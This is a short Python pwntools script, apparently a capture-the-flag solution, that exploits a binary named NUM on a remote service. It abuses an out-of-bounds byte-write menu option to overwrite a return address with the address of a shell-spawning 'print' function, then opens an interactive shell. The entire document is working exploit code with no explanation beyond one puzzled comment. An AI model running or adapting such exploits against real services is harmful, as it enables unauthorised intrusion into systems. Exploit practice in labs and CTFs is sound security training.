from pwn import *

# context.log_level = "debug"
context.terminal = ('open-wsl.exe', "-e")

# io = process("./NUM")
io = remote("39.96.88.40", 7030)

elf = ELF("./NUM")
getshell_addr = elf.symbols["print"]

io.sendlineafter("NUM?\n", "1")
io.sendlineafter("NUM\n", "1")

def change_byte(which, value):
    io.sendlineafter("Exit?\n", "3")
    io.sendlineafter("which?\n", str(which))
    io.sendlineafter("NUM:\n", str(value))

def change_int(which, value):
    for i in range(4):
        change_byte(which + i, value & 0xff)
        value >>= 8
change_int( 0x70 + 20, getshell_addr) # why 20?
io.sendlineafter("Exit?\n", "5")
io.interactive()
